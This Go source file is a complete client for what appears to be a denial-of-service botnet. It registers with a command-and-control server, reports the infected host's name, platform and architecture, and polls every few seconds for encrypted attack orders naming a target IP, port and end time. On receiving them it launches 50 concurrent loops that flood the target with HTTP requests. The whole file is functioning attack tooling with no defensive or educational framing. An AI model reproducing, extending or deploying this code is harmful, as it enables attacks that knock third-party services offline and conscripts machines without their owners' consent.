package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"
)

type Creds struct {
	ID    string `json:"identifier"`
	Token string `json:"token"`
}

type Session struct {
	Key string `json:"key"`
}

type BootInstructions struct {
	ID   string `json:"identifier"`
	Ip   string `json:"ip"`
	Port string `json:"port"`
	End  string `json:"endTime"`
}

func Pad(buf []byte, size int) ([]byte, error) {
	bufLen := len(buf)
	padLen := size - bufLen%size
	padded := make([]byte, bufLen+padLen)
	copy(padded, buf)
	for i := 0; i < padLen; i++ {
		padded[bufLen+i] = byte(padLen)
	}
	return padded, nil
}

func Unpad(padded []byte, size int) ([]byte, error) {
	if len(padded)%size != 0 {
		return nil, errors.New("pkcs7: Padded value wasn't in correct size.")
	}

	bufLen := len(padded) - int(padded[len(padded)-1])
	buf := make([]byte, bufLen)
	copy(buf, padded[:bufLen])
	return buf, nil
}

func Encrypt(unencrypted string, cipher_key string) (string, error) {
	key := []byte(cipher_key)
	plainText := []byte(unencrypted)
	plainText, err := Pad(plainText, aes.BlockSize)
	if err != nil {
		return "", fmt.Errorf(`plainText: "%s" has error`, plainText)
	}
	if len(plainText)%aes.BlockSize != 0 {
		err := fmt.Errorf(`plainText: "%s" has the wrong block size`, plainText)
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	cipherText := make([]byte, aes.BlockSize+len(plainText))
	iv := cipherText[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return "", err
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(cipherText[aes.BlockSize:], plainText)

	return fmt.Sprintf("%x", cipherText), nil
}

func Decrypt(encrypted string, cipher_key string) (string, error) {
	key := []byte(cipher_key)
	cipherText, _ := hex.DecodeString(encrypted)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	if len(cipherText) < aes.BlockSize {
		panic("cipherText too short")
	}
	iv := cipherText[:aes.BlockSize]
	cipherText = cipherText[aes.BlockSize:]
	if len(cipherText)%aes.BlockSize != 0 {
		panic("cipherText is not a multiple of the block size")
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(cipherText, cipherText)

	cipherText, _ = Unpad(cipherText, aes.BlockSize)
	return fmt.Sprintf("%s", cipherText), nil
}

func checkConnection(apiURL string) bool {
	var result bool = false

	resp, err := http.Get(apiURL)

	if err == nil {
		if resp.StatusCode == 200 {
			result = true
		}
	}

	return result
}

func checkAccount(apiURL string, id string, token string) bool {
	var result bool = false
	var checkAccountURL string = apiURL + "/client/check/" + id + "/" + token

	resp, _ := http.Get(checkAccountURL)

	if resp.StatusCode == 200 {
		result = true
	}

	return result
}

func registerAccount(apiURL string) []string {
	var registerAccountURL string = apiURL + "/client/register"
	var result []string

	requestBody, _ := json.Marshal(map[string]string{
		"": "",
	})

	resp, err := http.Post(registerAccountURL, "application/json", bytes.NewBuffer(requestBody))

	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			var decodedJSON Creds
			responseBytes, _ := ioutil.ReadAll(resp.Body)
			json.Unmarshal(responseBytes, &decodedJSON)
			result = append(result, decodedJSON.ID)
			result = append(result, decodedJSON.Token)
		}
	}

	return result
}

func checkFile(filePath string) bool {
	var result bool

	if _, err := os.Stat(filePath); err == nil {
		if err != nil {
			result = false
		} else {
			result = true
		}
	}

	return result
}

func writeToConfigFile(filePath string, id string, token string) {
	f, _ := os.Create(filePath)

	defer f.Close()

	f.WriteString(id + ":" + token)
}

func writeToBootFile(filePath string, id string) {
	f, _ := os.Create(filePath)

	defer f.Close()

	f.WriteString(id)
}

func readFromConfigFile(filePath string) []string {
	data, _ := ioutil.ReadFile(filePath)

	var fileContents string = string(data)
	var result []string = strings.Split(fileContents, ":")

	return result
}

func readFromBootFile(filePath string) string {
	data, _ := ioutil.ReadFile(filePath)

	var result string = string(data)

	return result
}

func updateDetails(apiURL string, sessionKey string, id string, token string) {
	var updateURL string = apiURL + "/update/details/" + id + "/" + token

	hostname, _ := os.Hostname()
	var platform string = runtime.GOOS
	var arch string = runtime.GOARCH

	encryptedHostname, _ := Encrypt(hostname, sessionKey)
	encryptedPlatform, _ := Encrypt(platform, sessionKey)
	encryptedArch, _ := Encrypt(arch, sessionKey)

	requestBody, _ := json.Marshal(map[string]string{
		"hostname": encryptedHostname,
		"platform": encryptedPlatform,
		"arch":     encryptedArch,
	})

	resp, err := http.Post(updateURL, "application/json", bytes.NewBuffer(requestBody))

	if err == nil {
		defer resp.Body.Close()
	}
}

func getSessionKey(apiURL string, id string, token string) string {
	var result string
	var sessionURL = apiURL + "/session/key/" + id + "/" + token

	resp, err := http.Get(sessionURL)

	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			var decodedJSON Session
			responseBytes, _ := ioutil.ReadAll(resp.Body)

			json.Unmarshal(responseBytes, &decodedJSON)
			result = string(decodedJSON.Key)
		}
	}

	return result
}

func checkBoot(apiURL string, id string, token string) bool {
	var result bool
	var bootURL string = apiURL + "/boot/" + id + "/" + token

	resp, err := http.Get(bootURL)

	if err == nil {
		if resp.StatusCode == 200 {
			result = true
		} else {
			result = false
		}
	}

	return result
}

func getBootInstructions(apiURL string, sessionKey string, id string, token string) []string {
	var result []string
	var bootURL string = apiURL + "/boot/" + id + "/" + token

	resp, err := http.Get(bootURL)

	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			var decodedJSON BootInstructions
			responseBytes, _ := ioutil.ReadAll(resp.Body)

			json.Unmarshal(responseBytes, &decodedJSON)

			unencryptedId, _ := Decrypt(decodedJSON.ID, sessionKey)
			unencryptedIp, _ := Decrypt(decodedJSON.Ip, sessionKey)
			unencryptedPort, _ := Decrypt(decodedJSON.Port, sessionKey)
			unencryptedEnd, _ := Decrypt(decodedJSON.End, sessionKey)

			result = append(result, unencryptedId)
			result = append(result, unencryptedIp)
			result = append(result, unencryptedPort)
			result = append(result, unencryptedEnd)
		}
	}

	return result
}

func bootRun(apiURL string, sessionKey string, id string, token string, bootFilePath string) {
	var bootActive bool = checkBoot(apiURL, id, token)

	if bootActive {
		var bootInstructions []string = getBootInstructions(apiURL, sessionKey, id, token)

		var savedBootID string = readFromBootFile(bootFilePath)

		if savedBootID != bootInstructions[1] {
			writeToBootFile(bootFilePath, bootInstructions[0])

			str := bootInstructions[3]
			t, _ := time.Parse(time.RFC3339, str)

			var endTime string = t.Format("2006-01-02 15:04:05.000000000 +0000 UTC")
			endTimeObject, _ := time.Parse("2006-01-02 15:04:05.000000000 +0000 UTC", endTime)

			for i := 0; i < 50; i++ {
				go bootRoutine(id, token, endTimeObject, bootInstructions)
			}

		} else {
			fmt.Println("Already booting")
		}

	} else {
		fmt.Println("No boot")
	}
}

func bootRoutine(id string, token string, endTime time.Time, bootInstructions []string) {
	for {
		var currentTime string = time.Now().UTC().Format("2006-01-02 15:04:05.000000000 +0000 UTC")
		currentTimeObject, _ := time.Parse("2006-01-02 15:04:05.000000000 +0000 UTC", currentTime)

		if currentTimeObject.After(endTime) {
			fmt.Println("end")
			break
		}

		flood(bootInstructions[1], bootInstructions[2])
	}
}

func flood(target string, port string) {
	resp, _ := http.Get(target + ":" + port)
	fmt.Println("Sent packet")
	if resp != nil {
		io.Copy(ioutil.Discard, resp.Body)
		resp.Body.Close()
	}
}

func main() {
	var bootFilePath string = "boot.txt"
	var configPath string = "config.txt"
	var apiURL string = "http://127.0.0.1:5332"

	var apiConnection bool = checkConnection(apiURL)

	if apiConnection == true {
		var configFileExists bool = checkFile(configPath)

		if configFileExists {
			var credidentials []string = readFromConfigFile(configPath)
			var credsValidated = checkAccount(apiURL, credidentials[0], credidentials[1])

			if credsValidated {

				var sessionKey string = getSessionKey(apiURL, credidentials[0], credidentials[1])

				updateDetails(apiURL, sessionKey, credidentials[0], credidentials[1])

				for range time.NewTicker(5 * time.Second).C {
					sessionKey = getSessionKey(apiURL, credidentials[0], credidentials[1])
					bootRun(apiURL, sessionKey, credidentials[0], credidentials[1], bootFilePath)
				}

			} else {
				var newCredidentials []string = registerAccount(apiURL)
				writeToConfigFile(configPath, newCredidentials[0], newCredidentials[1])
				main()
			}

		} else {
			var newCredidentials []string = registerAccount(apiURL)
			writeToConfigFile(configPath, newCredidentials[0], newCredidentials[1])
			main()
		}

	} else {
		time.Sleep(30 * time.Second)
		main()
	}
}
